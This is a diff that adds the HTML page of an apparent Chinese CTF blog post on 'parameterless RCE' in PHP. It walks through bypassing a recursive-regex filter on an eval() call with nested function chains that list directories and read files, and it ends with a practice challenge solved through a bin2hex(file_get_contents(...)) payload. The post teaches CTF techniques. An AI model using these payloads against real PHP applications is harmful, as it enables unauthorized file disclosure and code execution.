@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="qrl-0">
+    
+    
+    
+    
+    
+    
+    <title>无参数RCE（一） | 七里燃</title>
+    <!-- inject:style -->
+    <link href="/myblog/css/style.css" rel="stylesheet" type="text/css">
+    <!-- endinject -->
+    <style>
+        .cube-loading {
+            top: 0;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: url('/myblog/images/lg/loading.gif') no-repeat center center;
+            background-color: rgba(0,0,0,.7);
+        }
+
+        .cube-loading.out {
+            display: none;
+        }
+
+        .cube-loading:before {
+            display: block;
+            content: '加载中';
+            position: relative;
+            width: 100%;
+            top: 50%;
+            right: -50%;
+            color: #fff;
+        }
+
+        @media(max-width: 768px) {
+            .cube-loading:before {
+                font-size: 1.2em;
+                transform: translate(-24px,20px);
+                -webkit-transform: translate(-24px,20px);
+                -o-transform: translate(-24px,20px);
+                -ms-transform: translate(-24px,20px);
+            }
+        }
+
+        @media(min-width: 768px) {
+            .cube-loading:before {
+
+            }
+        }
+    </style>
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+<div class="cube-body">
+    <nav id="cube-top-memu" class="cube-menu">
+    <ul class="cube-menu-collapse">
+        
+        <li>
+            <i class="cube-icon cube-icon-home" aria-hidden="true"></i>
+            <a href="/myblog/">首页</a>
+        </li>
+        
+        <li>
+            <i class="cube-icon cube-icon-archive" aria-hidden="true"></i>
+            <a href="/myblog/archives">归档</a>
+        </li>
+        
+    </ul>
+</nav>
+<nav class="cube-side-menu" id="cube-side-menu">
+    <ul class="cube-menu-list">
+        
+        <li>
+            <a class="lrc-control">开启歌词</a>
+        </li>
+        
+        <li>
+            <a class="scroll-to-top">回到顶部</a>
+        </li>
+    </ul>
+</nav>
+    <header class="cube-header" id="cube-header">
+    <img src=" https://qlr-0.gitee.io/hhhh/background.jpg " alt="头部背景图片">
+    
+    <div class="cube-type">
+        <span class="cube-typed-title">七里燃の部落格</span>
+        <span class="cube-typed-cursor">|</span>
+    </div>
+    
+</header>
+
+    <style>
+        nav.cube-menu:before {
+            content: '';
+            visibility: hidden;
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 44px;
+        
+            filter: blur(5px);
+            -webkit-filter: blur(5px);
+        
+            z-index: -1;
+            background-image: url('https://qlr-0.gitee.io/hhhh/background.jpg');
+            background-repeat: no-repeat;
+            background-position: center -356px;
+            background-size: cover;
+            background-color: transparent;
+        }
+
+        header.cube-background.cube-header-background {
+            visibility: hidden;
+            background-image: url('https://qlr-0.gitee.io/hhhh/background.jpg');
+            background-position: center -400px;
+        }
+    </style>
+    <header class="cube-background cube-header-background">
+        
+        <div class="cube-type">
+            <span class="cube-typed-title">七里燃の部落格</span>
+            <span class="cube-typed-cursor">|</span>
+        </div>
+        
+    </header>
+    <div class="load-header-background"></div>
+    <script>
+        (function (window) {
+
+            window.headerModule = {}
+            window.headerModule.image = {
+                width: '2000',
+                height: '1414'
+            }
+
+        })(window)
+    </script>
+    
+    <div class="cube-content">
+        <div class="cube-left">
+            <div class="cube-article">
+    <h1 class="title">无参数RCE（一）</h1>
+    
+    <div class="cube-article-header">
+        <div class="cube-article-date">
+            <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+            <!-- moment.js对象 -->
+            2021-03-28
+        </div>
+        <div class="cube-article-tags">
+    <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+    
+    <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">#知识点</a>
+    
+</div>
+    </div>
+    
+    <div class="cube-article-content cube-markdown">
+        
+        <h2 id="什么是无参数？"><a href="#什么是无参数？" class="headerlink" title="什么是无参数？"></a>什么是无参数？</h2><p>就是只使用函数且函数不能带有参数，这里有多种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数等，形如：a(b(c()))</p>
+<p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) </span><br><span class="line">&#123; </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code);</span><br><span class="line">pre_match(&#39;&#x2F;et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code));</span><br></pre></td></tr></table></figure>
+
+<p>分析一下代码：</p>
+<ul>
+<li><code>preg_replace</code> 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。</li>
+<li>再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</li>
+<li><code>preg_match</code>的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</li>
+</ul>
+<h2 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h2><h3 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h3><p>通常我们可以通过<code>print_r(scandir(&#39;.&#39;));</code>来查看当前目录所有文件名，但要怎么构造这个点？</p>
+<p><code>print_r()</code>函数用于打印变量，以更容易理解的形式展示。</p>
+<p><code>scandir()</code>列出指定路径中的文件和目录。</p>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-51-10.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-51-10.png" alt="Snipaste_2020-12-23_12-51-10"></a></p>
+<h4 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv()"></a>1.localeconv()</h4><p><code>localeconv()</code> 函数返回包含本地数字及货币信息格式的数组。</p>
+<p><code>localeconv()</code>函数返回以下数组元素：</p>
+<ul>
+<li>[decimal_point] - 小数点字符</li>
+<li>[thousands_sep] - 千位分隔符</li>
+<li>[int_curr_symbol] - 货币符号 （例如：USD）</li>
+<li>[currency_symbol] - 货币符号 （例如：$）</li>
+<li>[mon_decimal_point] - 货币小数点符号</li>
+<li>[mon_thousands_sep] - 货币千位分隔符</li>
+<li>[positive_sign] - 正值符号</li>
+<li>[negative_sign] - 负值符号</li>
+<li>[int_frac_digits] - 国际小数数字</li>
+<li>[frac_digits] - 本地小数数字</li>
+<li>[p_cs_precedes] - if 如果货币符号在正值之前，则是 True (1)，否则是 False (0)。</li>
+<li>[p_sep_by_space] - True (1) 如果货币符号与正值之间有空间，则是 True (1)，否则是 False (0)。</li>
+<li>[n_cs_precedes] - True (1) if 货币符号在负值之前，则是 True (1)，否则是 False (0)。</li>
+<li>[p_sep_by_space] - True (1) 如果货币符号与负值之间有空间，则是 True (1)，否则是 False (0)。</li>
+<li>[p_sign_posn] - 格式化选项：<ul>
+<li>0 - 在数量和货币符号周围的圆括号</li>
+<li>1 - 数量和货币符号之前的 + 号</li>
+<li>2 - 数量和货币符号之后的 + 号</li>
+<li>3 - 货币符号之前的 + 号</li>
+<li>4 - 货币符号之后的 + 号</li>
+</ul>
+</li>
+<li>[n_sign_posn] - 格式化选项：<ul>
+<li>0 - 在数量和货币符号周围的圆括号</li>
+<li>1 - 数量和货币符号之前的 - 号</li>
+<li>2 - 数量和货币符号之后的 - 号</li>
+<li>3 - 货币符号之前的 - 号</li>
+<li>4 - 货币符号之后的 - 号</li>
+</ul>
+</li>
+<li>[grouping] - 显示如何分组数字的 Array（例如：3 指示 1 000 000）</li>
+<li>[mon_grouping] - 显示如何分组货币数字的 Array（例如：2 指示 1 00 00 00）</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-41-28.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-41-28.png" alt="Snipaste_2020-12-23_12-41-28"></a></p>
+<p><strong>数组第一项</strong>就是<code>.</code>，我们可以用<code>current()</code>返回数组中的单元，默认取第一个值，<code>current()</code>还有一个别名<code>pos()</code> 。如果<code>pos()</code>和<code>current()</code>都被过滤了，我们还可以使用<code>reset()</code>（该函数返回数组第一个单元的值，如果数组为空则返回 <code>FALSE</code>）</p>
+<p>这时我们可以通过<code>print_r(scandir(current(localeconv())));</code>来获取当前目录下文件</p>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-43-11.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-43-11.png" alt="Snipaste_2020-12-23_12-43-11"></a></p>
+<h4 id="2-chr-46"><a href="#2-chr-46" class="headerlink" title="2.chr(46)"></a>2.chr(46)</h4><p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-46-04.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_12-46-04.png" alt="Snipaste_2020-12-23_12-46-04"></a></p>
+<p><code>chr(46)</code>就是<code>.</code>,所有这边就要构造46，可以用下面几个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chr(rand()) (不推荐)</span><br><span class="line"></span><br><span class="line">chr(time())</span><br><span class="line"></span><br><span class="line">chr(current(localtime(time())))</span><br><span class="line"></span><br><span class="line">char(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</span><br></pre></td></tr></table></figure>
+
+<p><code>time()</code>返回当前时间的 Unix 时间戳，并格式化为日期。</p>
+<p><code>localtime()</code>以数值数组和关联数组的形式输出本地时间。</p>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_13-04-29.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_13-04-29.png" alt="Snipaste_2020-12-23_13-04-29"></a></p>
+<p><code>phpversion()</code>会返回该扩展的版本。 如果没有对应的版本信息,或者该扩展未启用,则返回 false。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">print_r(phpversion());  #返回返回PHP版本，如5.6.27</span><br><span class="line"></span><br><span class="line">print_r(floor(phpversion()))    #返回 5</span><br><span class="line"></span><br><span class="line">print_r(sqrt(floor(phpversion()))   #返回2.2360679774998</span><br><span class="line"></span><br><span class="line">print_r(tan(floor(sqrt(floor(phpversion()))))  #返回-2.1850398632615</span><br><span class="line"></span><br><span class="line">print_r(cosh(tan(floor(sqrt(floor(phpversion())))))  #返回4.5017381103491</span><br><span class="line"></span><br><span class="line">print_r(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))    #返回45.081318677156</span><br><span class="line"></span><br><span class="line">print_r(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))   #返回46 </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>用到的函数</strong></p>
+<p>floor() - 函数向下舍入为最接近的整数。</p>
+<p>sqrt() - 函数返回一个数的平方根。</p>
+<p>tan() - 函数返回一个数的正切。</p>
+<p>cosh() - 函数返回一个数的双曲余弦，定义为 ((exp(number) + exp(-number))/2)。</p>
+<p>sinh() - 函数返回一个数的双曲正弦，定义为 (exp(number) - exp(-number))/2)。</p>
+<p>ceil() - 函数向上舍入为最接近的整数。</p>
+</blockquote>
+<h3 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h3><blockquote>
+<p>current() - 返回数组中的单元，默认取第一个值。</p>
+<p>each() - 返回数组中当前键/值对并将数组指针向前移动一步。</p>
+<p>end() - 将数组的内部指针指向最后一个单元。</p>
+<p>next() - 将数组中的内部指针向前移一位。</p>
+<p>prev() - 将数组的内部指针倒回一位。</p>
+<p>show_source() - 函数对文件进行 PHP 语法高亮显示。show_source() 是 highlight_file()的别名。使用该函数时，整个文件都将被显示</p>
+<p>readfile() - 函数读取一个文件，并写入到输出缓冲。</p>
+<p>file_get_contents() - 把整个文件读入一个字符串中。</p>
+<p>getchwd() - 函数返回当前工作目录。</p>
+<p>array_reverse() - 以相反的元素顺序返回数组。</p>
+<p>array_rand() - 函数返回数组中的一个随机键名，或者如果指定函数返回键名不只一个，则返回一个包含随机键名的数组。</p>
+<p>array_flip() - 函数用于反转/交换数组中的键名和对应关联的键值。</p>
+<p>chdir() - 函数改变当前的目录。</p>
+<p>dirname() - 函数返回路径中的目录名称部分。</p>
+</blockquote>
+<h5 id="1-若文件在末位"><a href="#1-若文件在末位" class="headerlink" title="1.若文件在末位"></a>1.若文件在末位</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(show_source(end(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>还可以将数组倒过来读取,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(show_source(current(array_reverse(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-若文件在倒数第二位"><a href="#2-若文件在倒数第二位" class="headerlink" title="2.若文件在倒数第二位"></a>2.若文件在倒数第二位</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-若文件不在末位也不在在倒数第二位"><a href="#3-若文件不在末位也不在在倒数第二位" class="headerlink" title="3.若文件不在末位也不在在倒数第二位"></a>3.若文件不在末位也不在在倒数第二位</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
+
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;flag in flag.php</span><br><span class="line">$a&#x3D;&quot;&quot;;</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    if(preg_match(&quot;&#x2F;ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print&#x2F;i&quot;, $_GET[&#39;code&#39;]))&#123;</span><br><span class="line">        die(&quot;no no no !&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;\$a&#x3D;&quot;.$_GET[&#39;code&#39;]);</span><br><span class="line">    if(preg_match(&#39;&#x2F;flag&#x2F;&#39;, $a))&#123;</span><br><span class="line">        die(&quot;no&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo($a);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>代码审计</strong></p>
+<p>第一个if</p>
+<p>会对code进行过滤，要使传进来的替换后变为<code>;</code>,</p>
+<p>这里我们就要进行嵌套。</p>
+<p>第二个if</p>
+<p>过滤掉了我们上面所用到的大部分函数，只能用没被过滤的函数来构造payload</p>
+<p>第三个if</p>
+<p>a中不能含有flag</p>
+<p>绕过这三个if，我们就可以得到flag</p>
+<p>file_get_contents()这个没有被过滤，我们可以将我们上面提到的payload改一下<code>file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
+<p>由于会过滤flag，我们可以对读出来的文件进行加密，base被过滤了，我们可以用hex加密。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
+
+<p>由于是随机读取，所以要多刷新几次，然后hex解密就可得到flag。</p>
+
+    </div>
+</div>
+
+<div class="cube-article-nav">
+    <ul>
+        
+        <li class="prev">
+            <a href="/myblog/2021/03/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+                <i class="cube-icon cube-prev" aria-hidden="true"></i>
+                文件上传漏洞
+            </a>
+        </li>
+        
+        
+        <li class="next">
+            <a href="/myblog/2021/03/28/%E6%B5%B7%E5%95%B8%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/">
+                海啸杯部分题目wp
+                <i class="cube-icon cube-next" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+<!-- TODO 根据theme.comment的内容进行入口选择 -->
+
+
+
+        </div>
+        <div class="cube-right">
+            
+
+<div class="cube-search cube-sidebar" id="cube-search">
+    <div class="search-container">
+        <input type="text" placeholder="搜索" class="cube-search-input" id="cube-search-input">
+        <i class="cube-icon cube-icon-search cube-search-submit" aria-hidden="true"></i>
+    </div>
+    <!-- TODO 通过给window赋一个全局变量，通过脚本赋值 -->
+</div>
+<script>
+    (function (window) {
+        'use strict';
+        window.searchModule = {}
+        window.searchModule.JSONUrl = '/myblog/content.json'
+        window.searchModule.rootUrl = '/myblog/'
+    })(window)
+</script>
+<div class="cube-search-form">
+    <div class="cube-search-control">
+        <input type="text" placeholder="搜索" class="search-input">
+        <a class="close-button">
+            <i class="cube-icon cube-close" aria-hidden="true"></i>
+        </a>
+    </div>
+    <div class="cube-search-result"></div>
+</div>
+
+
+<div class="cube-author cube-sidebar" id="cube-author">
+    
+    
+    <span>qrl-0</span>
+    
+    
+    <div class="count">
+        <a class="count articles"><span>11</span>文章</a>
+        <a class="count tags"><span>1</span>标签</a>
+        <a class="count categories"><span>2</span>分类</a>
+    </div>
+</div>
+
+
+
+<div class="cube-music cube-sidebar" id="cube-music">
+    <div class="cube-player aplayer" id="cube-player"></div>
+</div>
+<script>
+    (function (window) {
+        window.musicModule = {}
+        window.musicModule.musicConfig = '{"narrow":false,"autoplay":false,"showlrc":3,"theme":"#b7daff","mutex":true,"mode":"circulation","preload":"auto","listmaxheight":"513px","music":[{"title":"Dear friends","author":"TRIPLANE","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/TRIPLANE - Dear friends.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Dear friends - TRIPLANE.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/TRIPLANE - Dear friends.jpg"},{"title":"Butter-Fly","author":"和田光司","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/和田光司 - Butter-Fly (ピアノヴァージョン).mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Butter-Fly (ピアノヴァージョン) - 和田光司.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/和田光司 - Butter-Fly (ピアノヴァージョン).jpg"},{"title":"宵闇花火","author":"葉月ゆら","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/葉月ゆら - 宵闇花火.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/宵闇花火 - 葉月ゆら.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/葉月ゆら - 宵闇花火.jpg"}]}'
+        window.musicModule.lrcConfig = {
+            open: '开启歌词',
+            close: '关闭歌词'
+        }
+    })(window)
+</script>
+
+
+
+<div class="cube-recent-posts cube-sidebar" id="cube-recent-posts">
+    <div class="title">
+        <a>近期文章</a>
+    </div>
+    <ul class="list">
+        
+        
+        <li>
+            <!-- TODO 如果文章要显示图片，那么在front-matter上添加preview属性(url or path) -->
+            
+            <div class="normal">
+                <p class="index first">
+                    <span>1</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/gitee+Hexo%20%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="gitee+Hexo 搭建简单的个人博客">gitee+Hexo 搭建简单的个人博客</a>
+                </p>
+            </div>
+            
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>2</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">PHP反序列化</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>3</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/ctf-Crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86/" title="ctf-Crypto常见加解密">ctf-Crypto常见加解密</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>4</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/" title="php反序列化练习">php反序列化练习</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>5</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/%E5%A4%8D%E7%8E%B0-%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86/" title="复现-我TMD烦死了">复现-我TMD烦死了</a>
+                </p>
+            </div>
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+
+<div class="cube-categories cube-sidebar" id="cube-categories">
+    <div class="title">
+        <a href="/myblog/categories">分类</a>
+    </div>
+    <div class="cube-boxs">
+        
+        
+        <div class="cube-box-bg ">
+            <a href="/myblog/categories/%E7%BB%83%E4%B9%A0/">#练习</a>
+        </div>
+        
+        
+        <div class="cube-box ">
+            <a href="/myblog/categories/blog/">#blog</a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="cube-tagcloud cube-sidebar" id="cube-tagcloud">
+    <div class="title">
+        <a href="/myblog/tags">标签云</a>
+    </div>
+    <div class="cube-boxs">
+        
+        
+        <div class="cube-box-bg ">
+            <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">#知识点</a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="cube-links cube-sidebar" id="cube-links">
+    <div class="title">
+        <a>个人链接</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            
+            <a href="CHYbeta/Web-Security-Learning" target="_blank">学习</a>
+        </li>
+        
+    </ul>
+</div>
+
+
+
+<div class="cube-friend-links cube-sidebar" id="cube-friend-links">
+    <div class="title">
+        <a>友情链接</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            <!-- TODO change avatar.png to friend.png-->
+            <img src="/myblog/images/friend_links.jpg ">
+            <a href="" target="_blank"></a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+    </div>
+</div>
+<footer class="cube-footer">
+    
+© 2017 qrl-0
+
+<br>
+Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+</footer>
+<!-- inject:script -->
+<script src="/myblog/js/script.js"></script>
+<!-- endinject -->
+<div class="cube-loading out"></div>
+</body>
+</html>
